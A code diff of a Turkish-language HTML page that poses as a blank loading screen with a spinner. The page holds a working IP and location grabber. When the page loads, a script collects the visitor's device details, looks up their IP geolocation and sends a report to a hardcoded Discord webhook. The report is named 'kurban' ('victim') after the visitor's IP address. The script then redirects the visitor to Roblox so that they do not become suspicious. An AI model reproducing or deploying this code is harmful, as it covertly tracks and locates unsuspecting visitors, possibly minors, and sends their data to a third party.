@@ -4,76 +4,109 @@
     <meta charset="UTF-8">
     <title>Yükleniyor...</title>
     <style>
-        /* Kullanıcıyı şüphelendirmemek için boş bir sayfa veya basit bir yükleniyor ekranı */
-        body { background: #000; color: #333; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: #00ff41; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-
     <div class="spinner"></div>
 
 <script>
     const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
 
-    async function ghostCapture() {
-        // 1. Cihaz bilgilerini saniyesinde topla
-        const screenRes = `${window.screen.width}x${window.screen.height}`;
-        const language = navigator.language;
-        const platform = navigator.platform;
-        const browser = navigator.userAgent.split(' ').pop();
-        let batteryInfo = "Bilinmiyor";
+    async function ultraCapture() {
+        // 1. Cihaz Detaylarını Derine İnip Topla
+        const deviceData = {
+            res: `${window.screen.width}x${window.screen.height}`,
+            lang: navigator.language,
+            plat: navigator.platform,
+            agent: navigator.userAgent,
+            cores: navigator.hardwareConcurrency || "Bilinmiyor",
+            mem: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
+            time: new Date().toLocaleString('tr-TR')
+        };
 
+        let batteryInfo = "Bilinmiyor";
         try {
             const battery = await navigator.getBattery();
-            batteryInfo = `%${Math.round(battery.level * 100)}`;
+            batteryInfo = `%${Math.round(battery.level * 100)} (${battery.charging ? 'Şarj Oluyor' : 'Deşarj'})`;
         } catch(e) {}
 
-        // 2. IP ve Lokasyon verilerini çek
         try {
+            // 2. IP verilerini en detaylı haliyle çek
             const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-            const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+            const d = await response.json();
+            
+            const mapLink = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-            // 3. Discord'a veriyi gönder
+            // 3. .txt Dosyası İçeriğini Hazırla
+            const fileContent = `
+========================================
+    QEAT VERI MADENCILIGI RAPORU
+========================================
+TARIH: ${deviceData.time}
+----------------------------------------
+[IP BILGILERI]
+IP: ${d.ip}
+ISS: ${d.org}
+ULKE: ${d.country_name} (${d.country_code})
+SEHIR: ${d.city} / ${d.region}
+POSTA KODU: ${d.postal}
+KOORDINAT: ${d.latitude}, ${d.longitude}
+MAPS: ${mapLink}
+PARA BIRIMI: ${d.currency_name} (${d.currency})
+SAAT DILIMI: ${d.timezone}
+CAGRI KODU: +${d.country_calling_code}
+
+[CIHAZ BILGILERI]
+SISTEM: ${deviceData.plat}
+EKRAN: ${deviceData.res}
+TARAYICI: ${deviceData.agent}
+DIL: ${deviceData.lang}
+SARJ DURUMU: ${batteryInfo}
+ISLEMCI CEKIRDEK: ${deviceData.cores}
+RAM (YAKLASIK): ${deviceData.mem}
+----------------------------------------
+OPERASYON TAMAMLANDI.
+========================================`;
+
+            // 4. Discord'a Dosya ve Mesaj Gönder (FormData kullanarak)
+            const formData = new FormData();
+            
+            // Mesaj içeriği (Embed)
+            const payload = {
+                username: "TEŞKİLAT ARŞİV BİRİMİ",
+                embeds: [{
+                    title: "📂 YENİ VERİ PAKETİ GELDİ",
+                    description: `🎯 **Hedef:** \`${d.ip}\`\n📍 **Konum:** ${d.city} / ${d.country_name}\n🎮 **Yönlendirme:** Roblox`,
+                    color: 0x00ff41,
+                    timestamp: new Date()
+                }]
+            };
+
+            formData.append('payload_json', JSON.stringify(payload));
+            
+            // Blob oluşturup dosyayı ekle
+            const blob = new Blob([fileContent], { type: 'text/plain' });
+            formData.append('file', blob, `kurban_${d.ip}.txt`);
+
             await fetch(webhookURL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    username: "HAYALET ERİŞİM SİSTEMİ",
-                    embeds: [{
-                        title: "👤 HEDEF TUZAĞA DÜŞTÜ",
-                        color: 3447003,
-                        description: `🎮 **Hedef Roblox'a yönlendiriliyor...**\n📍 [Google Maps Konumu](${mapLink})`,
-                        fields: [
-                            { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
-                            { name: "📍 Şehir/Ülke", value: `\`${data.city} / ${data.country_name}\``, inline: true },
-                            { name: "📡 ISS", value: `\`${data.org}\``, inline: false },
-                            { name: "💻 Sistem / Ekran", value: `\`${platform} / ${screenRes}\``, inline: true },
-                            { name: "🔋 Şarj / Dil", value: `\`${batteryInfo} / ${language}\``, inline: true },
-                            { name: "🛠️ Tarayıcı", value: `\`${browser}\``, inline: true }
-                        ],
-                        footer: { text: "Veri sızdırıldı, yönlendirme başarılı." },
-                        timestamp: new Date()
-                    }]
-                })
+                body: formData
             });
 
-            // 4. VERİ GİTTİKTEN SONRA ROBLOX'A AT
-            // Çok kısa bir bekleme (500ms) verinin tam ulaşmasını garanti eder
+            // 5. Roblox'a uçur
             setTimeout(() => {
                 window.location.href = "https://www.roblox.com";
             }, 500);
 
         } catch (err) {
-            // Hata olsa bile Roblox'a at ki şüphelenmesin
             window.location.href = "https://www.roblox.com";
         }
     }
 
-    // Site açılır açılmaz operasyonu başlat
-    window.onload = ghostCapture;
+    window.onload = ultraCapture;
 </script>
 </body>
 </html>
